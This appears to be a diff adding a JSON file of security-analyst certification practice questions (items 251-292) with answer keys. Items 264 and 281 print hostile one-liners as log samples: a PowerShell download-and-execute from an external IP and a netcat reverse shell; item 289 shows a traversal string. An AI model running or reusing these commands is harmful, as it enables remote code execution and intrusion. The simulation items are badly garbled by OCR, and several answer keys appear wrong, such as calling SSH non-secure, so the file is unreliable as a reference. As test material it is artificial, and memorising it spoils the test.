@@ -1,0 +1,598 @@
+[
+  {
+    "question_number": "251",
+    "question_text": "The SOC received a threat intelligence notification indicating that an employee's credentials were found on the dark web. The user's web and log-in activities were reviewed for malicious or anomalous connections, data uploads/downloads, and exploits. A review of the controls confirmed multifactor authentication was enabled. Which of the following should be done first to mitigate impact to the business networks and assets?",
+    "image": null,
+    "options": {
+      "A": "Perform a forced password reset.  ",
+      "B": "Communicate the compromised credentials to the user.",
+      "C": "Perform an ad hoc AV scan on the user's laptop.",
+      "D": "Review and ensure privileges assigned to the user's account reflect least privilege.",
+      "E": "Lower the thresholds for SOC alerting of suspected malicious activity"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "252",
+    "question_text": "A security analyst is working on a server patch management policy that will allow the infrastructure team to be informed more quickly about new patches. Which of the following would most likely be required by the infrastructure team so that vulnerabilities can be remediated quickly? (Choose two.)",
+    "image": null,
+    "options": {
+      "A": "Hostname  ",
+      "B": "Missing KPI",
+      "C": "CVE details  ",
+      "D": "POC availabilty",
+      "E": "loCs",
+      "F": "npm identifier"
+    },
+    "correct_answer": "AC"
+  },
+  {
+    "question_number": "253",
+    "question_text": "Chief Information Security Officer (CISO) wants to disable a functionality on a business-critical web application that is vulnerable to RCE in order to maintain the minimum risk level with minimal increased cost. Which of the following risk treatments best describes what the CISO is looking for?",
+    "image": null,
+    "options": {
+      "A": "Transfer",
+      "B": "Mitigate  ",
+      "C": "Accept",
+      "D": "Avoid"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "254",
+    "question_text": "A company has a primary control in place to restrict access to a sensitive database. However, the company discovered an authentication vulnerability that could bypass this control. Which of the following is the best compensating control?",
+    "image": null,
+    "options": {
+      "A": "Running regular penetration tests to identify and address new vulnerabilities.",
+      "B": "Conducting regular security awareness training of employees to prevent social engineering attacks.",
+      "C": "Deploying an additional layer of access controls to verify authorized individuals.  ",
+      "D": "Implementing intrusion detection software to alert security teams of unauthorized access attempts"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "255",
+    "question_text": "An analyst discovers unusual outbound connections to an IP that was previously blocked at the web proxy and firewall. Upon further investigation, it appears that the proxy and firewall rules that were in place were removed by a service account that is not recognized. Which of the following parts of the Cyber Kill Chain does this describe?",
+    "image": null,
+    "options": {
+      "A": "Delivery",
+      "B": "Command and control  ",
+      "C": "Reconnaissance",
+      "D": "Weaponization"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "256",
+    "question_text": "An organization's email account was compromised by a bad actor. Given the following information:\n\n\"Time\n\",\"Description\n\"\r\n\"8:30 a m\n\",\"A total of 2,000 emails were sent from the compromised\n account. The email directed the recipients to pay an\n invoice Enclosed in the email was a short message\n along with a link and an attachment was contained in\n the email\n\"\r\n\"8:45 am\n\",\"Recipients started alerting the organization's help desk\n about the email\n\"\r\n\"8:55 am\n\",\"The help desk escalated the issue to the CSIRT\n\"\r\n\"9-10 am\n\",\"The IRT was assembled, a call bridge was established,\n and the Chief Information Security Officer declared an\n incident\n\"\r\n\"9:15 am\n\",\"The web session for the email account was revoked\n and password resets were initiated. The machine was\n investigated further to ensure security controls were in\n place\n\"\r\n\"9:30 am\n\",\"All sent emails were removed from organization's\n servers\n\"\r\n\"9:35 am\n\",\"The CSIRT lowered the priority of the incident and\n started to review logs\n\"\r\n\"9:45 am\n\",\"Passwords were reset for all internal users that clicked\n on the link\n\"\r\n\"9.50 am\n\",\"Continued analysis to determine the impact was\n limited\n\"\r\n\"10:30 am\n\",\"Besides continued monitoring the organization\n reasonably believed the threat was remediated\n\"\n\nWhich of the following is the length of time the team took to detect the threat?",
+    "image": null,
+    "options": {
+      "A": "25 minutes",
+      "B": "40 minutes  ",
+      "C": "45 minutes",
+      "D": "2 hours"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "257",
+    "question_text": "A threat hunter seeks to identify new persistence mechanisms installed in an organization's environment. In collecting scheduled tasks from all enterprise workstations, the following host details are aggregated:\n\n\"Task name\n\",\"Target process\n\",\"Number\n of hosts\n\",\"Task user account\n\"\r\n\"RtkAudUService64 BG\n\",\"C:\\Windows\\System32\\RtkAudUService64.exe\n\",\"502\n\",\"NT\n Authority/SYSTEM\n\"\r\n\"BatteryGaugeMaintenance\n\",\"%ProgramData%\\Lenovo\\Plugins\\BGHelper.exe\n\",\"410\n\",\"NT\n Authority/SYSTEM\n\"\r\n\"RtHVBg_PushButton\n\",\"C:\\Program\n Files\\Realtek Audio\\HDA\\RAVBg64.exe\n\",\"870\n\",\"NT\n Authority/SYSTEM\n\"\r\n\"UpdateService\n\",\"C:\\Users\\sam AppData\\Roaming\\Temp\\taskhw.exe\n\",\"1\n\",\"PROD\\sam\n\"\n\nWhich of the following actions should the hunter perform first based on the details above?",
+    "image": null,
+    "options": {
+      "A": "Acquire a copy of taskhw.exe from the impacted host.  ",
+      "B": "Scan the enterprise to identify other systems with taskhdw.exe present.",
+      "C": "Perform a public search for malware reports on the taskhw.exe.",
+      "D": "Change the account that runs the taskhw.exe scheduled task."
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "258",
+    "question_text": "A SOC analyst is analyzing traffic on a network and notices an unauthorized scan. Which of the following types of activities is being observed?",
+    "image": null,
+    "options": {
+      "A": "Potential precursor to an attack  ",
+      "B": "Unauthorized peer-to-peer communication",
+      "C": "Rogue device on the network",
+      "D": "System updates."
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "259",
+    "question_text": "HOTSPOT\n\nWelcome to the Enterprise Help Desk System. Please work the ticket escalated to you in the help desk ticket queue.\n\nINSTRUCTIONS\n\nClick on the ticket to see the ticket details. Additional content is available on tabs within the ticket.\n\nFirst, select the appropriate issue from the drop-down menu. Then, select the MOST likely root cause from second drop-down menu.\n\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.\n\nTickets\n\nDetails\n\n#8675309\n\nOpened\n\nSubject\n\nDate\n\nPriority Priority\n\nHigh\n\nMichael is reporting that th...\n #8675309\n\n5/13/2024\n\nHigh\n\nCategory\n\nTechnical/ Bug Reports\n\nAssigned To\n\nsample@emailaddress.com\n\nAssigned Date 5/13/2024\n\nInfo Assets Users Approved Software\n\nSubject\n\nMichael is reporting that the Internet kiosk\n machine is intermittently freezing and has\n lagged performance\n\nAttachments none\n Issue\n\nCaused by\n\nHigh Memory Utilization\n Drive is low on space\n Services Failed to Start\n High CPU Utilization\n Recent Windows Updates\n User is not logged in\n Application Crash\n\nChrome.exe\n\nUser\n\nsvchost.exe\n\nFirefox.exe\n\nnotepad.exe\n\ntaskmgr.exe\n\nAsset Tag\n wuauclt.exe",
+    "image": null,
+    "options": {},
+    "correct_answer": null
+  },
+  {
+    "question_number": "260",
+    "question_text": "SIMULATION\n\nA company recently experienced a security incident. The security team has determined a user clicked on a link embedded in a phishing email that was sent to the entire company. The link resulted in a malware download, which was subsequently installed and run.\n\nINSTRUCTIONS\n\nPart 1\n\nReview the artifacts associated with the security Incident. Identify the name of the malware, the malicious IP address, and the date and time when the malware executable entered the organization.\n\nPart 2\n\nReview the kill chain items and select an appropriate control for each that would improve the security posture of the organization and would have helped to prevent this incident from occurring. Each control may only be used once, and not all controls will be used.\n\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.\n\nFirewall\n log\n\nFile integrity\n monitoring report\n\nMalware\n domain list\n\nVulnerability\n scan report\n\nPhishing\n email\n\nKill chain item\n\nPhang emal\n\nHoneypot\n\nActive leks\n\nНебская\n\nVPN\n\nMahapre\n\nEmail filtering\n Backups\n\nMAC filtering\n\nMFA\n\nDisk-level encryption\n Network segmentation\n\nUpdated antivirus\n\nRestricted local user\n permissions\n\nFirewall file type filter\n IP blocklist\n\nPlain test email format\n\nMare meal\n\nIdentify the following:\n\nМайские весоtable Select option\n\nHe\n PARCLEOR\n\nHoneypot\n Email filtering\n\nMalicious IP adds Select option\n\nBackups\n\nVPN\n\nFile encryption\n\nMAC filtering\n MFA\n\nDisk-level encryption\n Network segmentation\n Updated antivirus\n Restricted local user\n permissions\n\nFirewall file type filter\n IP blocklist\n\nPlain test email format\n\nDotsitave malware\n\nFirewall\n log\n\nFile integrity\n monitoring report\n\nMalware\n\nVulnerability\n\ndomain list\n\nscan report\n\nPhishing\n email\n\nKill chain item\n\nPhading amal Select\n\nActive liras\n\nHoneypot\n\nMalicous\n\n асси\n\nEmail filtering\n\nBackups\n\nMal\n\nVPN\n\ndownload\n\nMAC filtering\n\nMFA\n\nDisk-level encryption\n Network segmentation\n Updated antivirus\n\nRestricted local user\n permissions\n\nFirewall file type filter\n IP blocklist\n\nPlain test email format\n\nSelect con\n\nMalware\n  \n\nTeen\n\nHoneypot\n\nEmail filtering\n Backups\n\nVPN\n\nMAC filtering\n\nMFA\n\nDisk-level encryption\n Network segmentation\n Updated antivirus\n Restricted local user\n permissions\n\nFirewall file type filter\n IP blocklist\n\nPlain test email format\n\nIdentify the following:\n\nMalcous exerstable Select option\n\nMalcos IP addss Select option\n\nDentanemale Select option\n entered organicañon\n\nFirewall\n log\n\nFile integrity\n monitoring report\n\nMalware\n domain list\n\nKill chain item\n\nPhishing\n email\n\nPhosting emal Select contro\n\nMalnare all Select conta\n\nIdentify the following:\n\nMalicious entable Sollect option\n\nActive links\n\nSelect control\n\nMee\n exmcudon\n\nSelect control\n\nMalicious Pams\n\n81.161.63.103\n\nMalicous\n\nSelect control\n\nThe encryption Select cotto\n\nDenne malware\n Dan\n\nSelect option\n\nHalwe\n\nHoneypot\n\nEmail filtering\n\nBackups\n\nVPN\n\nMAC filtering\n\nMFA\n\nDisk-level encryption\n\nNetwork segmentation\n\nUpdated antivirus\n\nRestricted local user\n\npermissions\n\nFirewall file type filter\n IP blocklist\n\nPlain test email format\n\nFirewall\n log\n\nFile integrity\n monitoring report\n\nMalware\n domain list\n\nVulnerability\n scan report\n\nPhishing\n email\n\nKill chain item\n\nIdentify the following:\n\nPengenal Sextet\n\nActtue leke\n\nMalicous\n sunbuite acous\n\nMakare\n doenload\n\nSelect control\n\nMSc\n\nMalocus excutate Select option\n\nSelect concol\n\nHalowe\n\nSelect consol\n\nPalco Pass Select option\n\nSelect concol\n\nFie encryption Select consol\n\nDatsione mahuere\n entered organicDon\n\n1 Dec 2019 14:03:19\n\n1 Dec 2019 13:59:25\n\nFirewall\n log\n\nFile integrity\n monitoring report\n\nMalware\n domain list\n\nVulnerability\n scan report\n\nPhishing\n email\n\nKill chain item\n\nIdentify the following:\n\n▼\n\nHoneypot\n\nEmail filtering\n Backups\n\nVPN\n\nMAC filtering\n\nMFA\n\nDisk-level encryption\n Network segmentation\n Updated antivirus\n\nRestricted local user\n permissions\n\nFirewall file type filter\n IP blocklist\n\nPlain test email format\n\nHoneypot\n\nEmail filtering\n Backups\n\nVPN\n\nMAC filtering\n\nMFA\n\nDisk-level encryption\n Network segmentation\n\nIndated antivirus\n\nRestricted local user\n\npermissions\n\nFirewall file type filter\n IP blocklist\n\nPlain test email format\n\nFirewall\n log\n\nKill chain item\n\nht\n\nFile integrity\n monitoring report\n\nCorrect Answer:\n\nActive laika\n\nMalware\n domain list\n\nVulnerability\n\nscan report\n\n▼\n\nHoneypot\n\nEmail filtering\n Backups\n\nVPN\n\nMAC filtering\n\nMFA\n\nDisk-level encryption\n Network segmentation\n Updated antivirus\n\nRestricted local user\n\nHoneypot\n Email filtering\n Backups\n\nVPN\n\nMAC filtering\n MFA\n\nDisk-level encryption\n Network segmentation\n Updated antivirus\n Resincted local user\n\nPhishing\n email\n\nIdentify the following:\n\n або\n\nDesem\n\n30 Nov 2019 12:05:34\n\n1 Dec 2019 14:03:55\n\n1 Dec 2019 11:24:16\n\n30 Nov 2019 12:25:13\n 1 Dec 2019 14:25:30",
+    "image": null,
+    "options": {},
+    "correct_answer": null
+  },
+  {
+    "question_number": "261",
+    "question_text": "A cybersecurity analyst is recommending a solution to ensure emails that contain links or attachments are tested before they reach a mail server. Which of the following will the analyst most likely recommend?",
+    "image": null,
+    "options": {
+      "A": "Sandboxing",
+      "B": "MFA",
+      "C": "DKIM",
+      "D": "Vulnerability scan"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "262",
+    "question_text": "An analyst reviews a recent government alert on new zero-day threats and finds the following CVE metrics for the most critical of the vulnerabilities:\n\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:U/RL:W/RC:R\n\nWhich of the following represents the exploit code maturity of this critical vulnerability?",
+    "image": null,
+    "options": {
+      "A": "E:U  ",
+      "B": "S:C",
+      "C": "RC:R",
+      "D": "AV:N",
+      "E": "AC:L"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "263",
+    "question_text": "A security analyst detects an email server that had been compromised in the internal network. Users have been reporting strange messages in their email inboxes and unusual network traffic. Which of the following incident response steps should be performed next?",
+    "image": null,
+    "options": {
+      "A": "Preparation",
+      "B": "Validation",
+      "C": "Containment  ",
+      "D": "Eradication"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "264",
+    "question_text": "A SIEM alert is triggered based on execution of a suspicious one-liner on two workstations in the organization's environment. An analyst views the details of these events below:\n\nrundll32.exe javascript:\\\"..\\\\mshtml, RunHMTLApplication \\\";document.write\n ();r=news20 ActiveXObject (\\\"WScript.Shell\\\").run (\\\"powershell w h -nologo\n noprofile -ep bypass IEX ((New-Object Net.WebClient). DownloadString\n (77.247.109.185/AccessToken.psl'))\\\",0,true);",
+    "image": null,
+    "options": {
+      "A": "Attacker is escalating privileges via JavaScript.",
+      "B": "Attacker is utilizing custom malware to download an additional script.",
+      "C": "Attacker is executing PowerShell script \"AccessToken.ps1\".  ",
+      "D": "Attacker is attempting to install persistence mechanisms on the target machine."
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "265",
+    "question_text": "When investigating a potentially compromised host, an analyst observes that the process BGInfo.exe (PID 1024), a Sysinternals tool used to create desktop backgrounds containing host details, has been running for over two days. Which of the following activities will provide the best insight into this potentially malicious process, based on the anomalous behavior?",
+    "image": null,
+    "options": {
+      "A": "Changes to system environment variables",
+      "B": "SMB network traffic related to the system process",
+      "C": "Recent browser history of the primary user",
+      "D": "Activities taken by PID 1024"
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "266",
+    "question_text": "Which of the following evidence collection methods is most likely to be acceptable in court cases?",
+    "image": null,
+    "options": {
+      "A": "Copying all access files at the time of the incident",
+      "B": "Creating a file-level archive of all files",
+      "C": "Providing a full system backup inventory",
+      "D": "Providing a bit-level image of the hard drive  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "267",
+    "question_text": "A cybersecurity analyst has recovered a recently compromised server to its previous state. Which of the following should the analyst perform next?",
+    "image": null,
+    "options": {
+      "A": "Eradication",
+      "B": "Isolation",
+      "C": "Reporting",
+      "D": "Forensic analysis  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "268",
+    "question_text": "SIMULATION\n\nYou are a penetration tester who is reviewing the system hardening guidelines for a company's distribution center. The company's hardening guidelines indicate the following:\n\n• There must be one primary server or service per device.\n\n• Only default ports should be used.\n\n• Non-secure protocols should be disabled.\n\n• The corporate Internet presence should be placed in a protected subnet.\n\nINSTRUCTIONS\n\nUsing the tools available, discover devices on the corporate network and the services that are running on these devices.\n\nYou must determine:\n\n• The IP address of each device.\n\n• The primary server or service of each device.\n\n• The protocols that should be disabled based on the hardening guidelines.\n\nIf at any time you would like to bring back the initial state of the simulation, please click the Reset All button.\n\nName: CandyManCarl.Local\n\nRole:\n\nFile Server\n\nDatabase\n\nMail Server\n\nSwitch\n\nWeb Server\n\nIP Address:\n\nNon-Compliant Service:\n\nSSH 22\n\nSMB/CIFS 445\n\nSMTP 25\n\nNetBIOS 139\n\nHTTPS 443\n\nSwitch\n\nWeb Server\n\nMail Server\n\nDatabase\n\nFile Server\n\nIP Address:\n\nNon-Compliant Service:\n\nFTP 21\n\nSSH 22\n\nTelnet 23\n\nIMAP/S 993\n\nRPC 135\n\nHTTP 80\n\nHTTP 80\n\nRPC 135\n\nFTP 21\n\nSMB/CIFS 445\n\nSSH 22\n\nRPC 135\n\nHTTPS 443\n\nIMAP 143\n\nIMAP/S 993\n\nDNS 53\n\nDNS 53\n\nDNS 53\n\nIMAP 143\n\nIMAP/S 993\n\nMYSQL 3306\n\nSMTP 25\n\nIMAP 143\n\nTelnet 23\n\nNetBIOS 139\n MYSQL 3306\n\nHTTP 80\n\nMYSQL 3306\n\nTelnet 23\n\nDMZ\n\nFirewall\n\nInternet\n\nYou Are Here\n\nConsole\n\nName: Farmer Ted.Local\n\nRole:\n\nDatabase\n Mail Server\n Switch\n\nFile Server\n\nWeb Server\n\nIP Address:\n\nNon-Compliant Service:\n\nDNS 53\n\nMYSQL 3306\n\nNetBIOS 139\n\nSMTP 25\n\nName: Lunch TimeMike.Local\n\nRole:\n\nWeb Server\n\nMail Server\n\nDatabase\n\nFile Server\n\nSwitch\n\nIP Address:\n\nNon-Compliant Service:\n\nNetBIOS 139\n\nMYSQL 3306\n\nSMTP 25\n\nIMAP/S 993\n\nHTTPS 443\n\nCorrect Answer:\n\nRPC 135\n\nSSH 22\n\nFTP 21\n\nHTTPS 443\n\nHTTP 80\n\nSMB/CIFS 445\n\nIMAP/S 993\n\nTelnet 23\n\nIMAP 143\n\nHTTP 80\n\nTelnet 23\n\nSMB/CIFS 445\n\nFTP 21\n\nSSH 22\n\nIMAP 143\n\nRPC 135\n\nDNS 53\n\nFor CandyManCarl.Local, based on the available options and following the guidelines:\n\n• Choose File Server as the primary service\n\nIP address should be 192.168.1.1\n\nDisable the following non-secure protocols:\n\n. SSH (22)-Non-secure remote access protocol.\n\n• Telnet (23)-Non-secure terminal access protocol.\n\n• IMAP (143) - Non-secure mail protocol.\n\nFTP (21)-Non-secure file transfer protocol.\n\n• NetBIOS (139) - Often linked with security vulnerabilities.\n\nFor FarmerLaura. Local, based on the available options and following the guidelines:\n\nChoose Web Server as the primary service\n\nIP address 192.168.1.2\n\n• Disable the following non-secure protocols:\n\nFTP (21)-Non-secure file transfer protocol.\n\nSSH (22)-Non-secure remote access protocol (depending on the implementation).\n\n• Telnet (23) Outdated and insecure protocol for remote access.\n\nIMAP (143) - Non-secure mail access protocol.\n\n. SMTP (25)-Non-secure email transfer protocol (should use encrypted alternatives like SMTPS on\n port 465 or 587).\n\n• NetBIOS (139) - Non-secure protocol that may expose the system to vulnerabilities.\n\nRPC (135) Often linked to security risks, especially when exposed externally.\n\nMySQL (3306)-MySQL database port should be secured if exposed externally.\n\nFor SandwichSara. Local, based on the available options and following the guidelines:\n\nChoose Web Server as the primary service\n\nIP address 192.168.1.3\n\n• Disable the following non-secure protocols:\n\n FTP (21)-Non-secure file transfer protocol.\n\nTelnet (23) Outdated and insecure protocol for remote access.\n\n• NetBIOS (139) Protocol often associated with security vulnerabilities.\n\nSMB/CIFS (445) - Non-secure file-sharing protocol.\n\n• SSH (22) -Non-secure remote access protocol (depending on configuration).\n\nIMAP (143)-Non-secure mail protocol.\n\n. SMTP (25) Should be replaced with encrypted alternatives.\n\nMySQL (3306) - If the database is exposed externally, it needs to be secured.\n\n RPC (135)- Often associated with vulnerabilities and should be disabled if unnecessary.\n\nFor FarmerTed.Local, based on the available options and following the guidelines:\n\nChoose Database as the primary service\n\nIP address 192.168.1.4\n\nDisable the following non-secure protocols:\n\nFTP (21)-Non-secure file transfer protocol.\n\n Telnet (23) Outdated and insecure protocol for remote access.\n\nSSH (22)-Non-secure remote access protocol (depending on configuration).\n\n• IMAP (143) - Non-secure mail protocol.\n\nSMTP (25)-Non-secure mail transfer protocol.\n\n• NetBIOS (139) - Non-secure protocol vulnerable to attacks.\n\nRPC (135) Often associated with security vulnerabilities.\n\nSMB/CIFS (445) Non-secure file-sharing protocol.\n\nMySQL (3306) If exposed to the internet or non-secure networks, it needs to be secured.\n\n DNS (53)-Should be carefully managed, as DNS exposure can lead to DNS-based attacks.\n\nFor LunchTimeMike.Local (located in the DMZ), based on the system hardening guidelines:\n\nChoose Web Server as the primary service, since it is likely part of the external corporate presence in the\n DMZ.\n\nAssign an IP address 192.168.2.1 (since it is located in the DMZ, it may be in a different subnet).\n\n• The following non-compliant services should be disabled to ensure security in the DMZ:\n\nFTD/01 Non.caonra fila transfer protocol should ha disabled in a TM7",
+    "image": null,
+    "options": {},
+    "correct_answer": null
+  },
+  {
+    "question_number": "269",
+    "question_text": "A cybersecurity analyst has been assigned to the threat-hunting team to create a dynamic detection strategy based on behavioral analysis and attack patterns. Which of the following best describes what the analyst will be creating?",
+    "image": null,
+    "options": {
+      "A": "Bots",
+      "B": "locs",
+      "C": "TTPS  ",
+      "D": "Signatures"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "270",
+    "question_text": "Which of the following would eliminate the need for different passwords for a variety of internal applications?",
+    "image": null,
+    "options": {
+      "A": "CASB",
+      "B": "SSO",
+      "C": "PAM",
+      "D": "MFA"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "271",
+    "question_text": "Which of the following best explains the importance of communicating with staff regarding the official public communication plan related to incidents impacting the organization?",
+    "image": null,
+    "options": {
+      "A": "To establish what information is allowed to be released by designated employees  ",
+      "B": "To designate an external public relations firm to represent the organization",
+      "C": "To ensure that all news media outlets are informed at the same lime",
+      "D": "To define how each employee will be contacted after an event occurs"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "272",
+    "question_text": "Which of the following would most likely be used to update a dashboard that integrates with multiple vendor tools?",
+    "image": null,
+    "options": {
+      "A": "Webhooks  ",
+      "B": "Extensible Markup Language",
+      "C": "Threat feed combination",
+      "D": "JavaScript Object Notation"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "273",
+    "question_text": "An organization has a critical financial application hosted online that does not allow event logging to send to the corporate SIEM. Which of the following is the best option for the security analyst to configure to improve the efficiency of security operations?",
+    "image": null,
+    "options": {
+      "A": "Configure a new SIEM specific to the management of the hosted environment.",
+      "B": "Subscribe to a threat feed related to the vendor's application.",
+      "C": "Use a vendor-provided API to automate pulling the logs in real time.",
+      "D": "Download and manually import the logs outside of business hours."
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "274",
+    "question_text": "After an incident, a security analyst needs to perform a forensic analysis to report complete information to a company stakeholder. Which of the following is most likely the goal of the forensic analysis in this case?",
+    "image": null,
+    "options": {
+      "A": "Provide a full picture of the existing risks.",
+      "B": "Notify law enforcement of the incident.",
+      "C": "Further contain the incident.",
+      "D": "Determine root cause information.  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "275",
+    "question_text": "Which of the following is the most important reason for an incident response team to develop a formal incident declaration?",
+    "image": null,
+    "options": {
+      "A": "To require that an incident be reported through the proper channels  ",
+      "B": "To identify and document staff who have the authority to decrease an incident",
+      "C": "To allow for public disclosure of a security event impacting the organization",
+      "D": "To establish the department that responsible for responding to an incident"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "276",
+    "question_text": "An organization has establish a formal change management process after experiencing several critical system failures over the past year. Which of the following are key factors that the change management process will include in order to reduce the impact of system failures? (Choose two.)",
+    "image": null,
+    "options": {
+      "A": "Ensure users the document system recovery plan prior to deployment.  ",
+      "B": "Perform a full system-level backup following the change.",
+      "C": "Leverage an audit tool to identify changes that are being made.",
+      "D": "Identify assets with dependence that could be impacted by the change.  ",
+      "E": "Require diagrams to be completed for all critical systems.",
+      "F": "Ensure that all assets are properly listed in the inventory management system."
+    },
+    "correct_answer": "AD"
+  },
+  {
+    "question_number": "277",
+    "question_text": "An analyst is suddenly unable to enrich data from the firewall. However, the other open intelligence feeds continue to work. Which of the following is the most likely reason in the firewall feed stopped working?",
+    "image": null,
+    "options": {
+      "A": "The firewall service account was locked out.",
+      "B": "The firewall was using a paid feed.",
+      "C": "The firewall certificate expired.  ",
+      "D": "The firewall failed open."
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "278",
+    "question_text": "A security analyst would like to integrate two different SaaS-based security toots so that one tool can notify the other in the event a threat is detected. Which of the following should the analyst utilize to best accomplish this goal?",
+    "image": null,
+    "options": {
+      "A": "SMB share",
+      "B": "API endpoint  ",
+      "C": "SMTP notification",
+      "D": "SNMP trap"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "279",
+    "question_text": "An analyst is imaging a hard drive that was obtained from the system of an employee who is suspected of going rogue. The analyst notes that the initial hash of the evidence drive does not match the resultant hash of the imaged copy. Which of the following best describes the reason for the conflicting investigative findings?",
+    "image": null,
+    "options": {
+      "A": "Chain of custody was not maintained for the evidence drive.",
+      "B": "Legal authorization was not obtained prior to seizing the evidence drive.",
+      "C": "Data integrity of the imaged drive could not be verified.",
+      "D": "Evidence drive imaging was performed without a write blocker."
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "280",
+    "question_text": "A development team is preparing to roll out a beta version of a web application and wants to quickly test for vulnerabilities, including SQL injection, path traversal, and cross-site scripting. Which of the following tools would the security team most likely recommend to perform this test?",
+    "image": null,
+    "options": {
+      "A": "Hashcat",
+      "B": "OpenVAS",
+      "C": "OWASP ZAP  ",
+      "D": "Nmap"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "281",
+    "question_text": "A security analyst detected the following suspicious activity:\n\nrm -f/tmp/f;mknod /tmp/f p;cat/tmp/fl/bin/sh -i 2>&1 nc $10.0.0.1~1234>tmp/f$\n\nWhich of the following most likely describes the activity?",
+    "image": null,
+    "options": {
+      "A": "Network pivoting",
+      "B": "Host scanning",
+      "C": "Privilege escalation",
+      "D": "Reverse shell  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "282",
+    "question_text": "An analyst is designing a message system for a bank. The analyst wants to include a feature that allows the recipient of a message to prove to a third party that the message came from the sender.\n\nWhich of the following information security goals is the analyst most likely trying to achieve?",
+    "image": null,
+    "options": {
+      "A": "Non-repudiation  ",
+      "B": "Authentication",
+      "C": "Authorization",
+      "D": "Integrity"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "283",
+    "question_text": "Before adopting a disaster recovery plan, some team members need to gather in a room to review the written scenarios. Which of the following best describes what the team is doing?",
+    "image": null,
+    "options": {
+      "A": "Simulation",
+      "B": "Tabletop exercise  ",
+      "C": "Full test",
+      "D": "Parallel test"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "284",
+    "question_text": "Which of the following entities should an incident manager work with to ensure correct processes are adhered to when communicating incident reporting to the general public, as a best practice? (Choose two.)",
+    "image": null,
+    "options": {
+      "A": "Law enforcement",
+      "B": "Governance",
+      "C": "Legal",
+      "D": "Manager",
+      "E": "Public relations  ",
+      "F": "Human resources"
+    },
+    "correct_answer": "E"
+  },
+  {
+    "question_number": "285",
+    "question_text": "Due to an incident involving company devices, an incident responder needs to take a mobile phone to the lab for further investigation. Which of the following tools should be used to maintain the integrity of the mobile phone while it is transported? (Choose two.)",
+    "image": null,
+    "options": {
+      "A": "Signal-shielded bag  ",
+      "B": "Tamper-evident seal  ",
+      "C": "Thumb drive",
+      "D": "Crime scene tape",
+      "E": "Write blocker",
+      "F": "Drive duplicator"
+    },
+    "correct_answer": "AB"
+  },
+  {
+    "question_number": "286",
+    "question_text": "During the rollout of a patch to the production environment, it was discovered that required connections to remote systems are no longer possible. Which of the following steps would have most likely revealed this gap?",
+    "image": null,
+    "options": {
+      "A": "Implementation",
+      "B": "User acceptance testing",
+      "C": "Validation  ",
+      "D": "Rollback"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "287",
+    "question_text": "An organization has tracked several incidents that are listed in the following table:\n\n\"Start time\n\",\"Detection time\n\",\"Time elapsed in\n minutes\n\"\r\n\"17:20 am.\n\",\"10:30 am.\n\",\"180\n\"\r\n\"12:00 a.m.\n\",\"2:30 am.\n\",\"150\n\"\r\n\"9:25 8.m.\n\",\"12:15 p.m.\n\",\"170\n\"\r\n\"3:25 p.m.\n\",\"5:45 p.m.\n\",\"140\n\"\n\nWhich of the following is the organization's MTTD?",
+    "image": null,
+    "options": {
+      "A": "140",
+      "B": "150",
+      "C": "160  ",
+      "D": "180"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "288",
+    "question_text": "A security analyst has found a moderate-risk item in an organization's point-of-sale application. The organization is currently in a change freeze window and has decided that the risk is not high enough to correct at this time. Which of the following inhibitors to remediation does this scenario illustrate?",
+    "image": null,
+    "options": {
+      "A": "Service-level agreement",
+      "B": "Business process interruption  ",
+      "C": "Degrading functionality",
+      "D": "Proprietary system"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "289",
+    "question_text": "While reviewing the web server logs, a security analyst notices the following snippet:\n\n..\\..\\..\\..\\boot.ini\n\nWhich of the following is being attempted?",
+    "image": null,
+    "options": {
+      "A": "Directory traversal  ",
+      "B": "Remote file inclusion",
+      "C": "Cross-site scripting",
+      "D": "Remote code execution",
+      "E": "Enumeration of /etc/passwd"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "290",
+    "question_text": "Exploit code for a recently disclosed critical software vulnerability was publicly available for download for several days before being removed. Which of the following CVSS v.3.1 temporal metrics was most impacted by this exposure?",
+    "image": null,
+    "options": {
+      "A": "Remediation level",
+      "B": "Exploit code maturity  ",
+      "C": "Report confidence",
+      "D": "Availability"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "291",
+    "question_text": "Which of the following in the digital forensics process is considered a critical activity that often includes a graphical representation of process and operating system events?",
+    "image": null,
+    "options": {
+      "A": "Registry editing",
+      "B": "Network mapping",
+      "C": "Timeline analysis  ",
+      "D": "Write blocking"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "292",
